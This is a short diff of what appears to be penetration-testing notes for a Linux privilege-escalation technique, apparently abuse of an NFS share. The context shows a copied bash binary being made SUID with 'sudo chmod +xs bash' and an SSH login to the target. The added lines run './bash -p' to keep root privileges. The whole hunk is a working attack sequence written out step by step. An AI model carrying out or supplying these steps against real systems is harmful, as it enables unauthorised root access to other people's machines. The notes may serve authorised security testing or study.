@@ -37,3 +37,6 @@ cd [MOUNT POINT] && sudo chmod +xs bash
 
 ### SSH into the remote host
 ssh -i [PRIVATE KEY] [USERNAME]@[HOSTNAME]
+
+### Run the bash executable (with p persisting permission)
+./bash -p
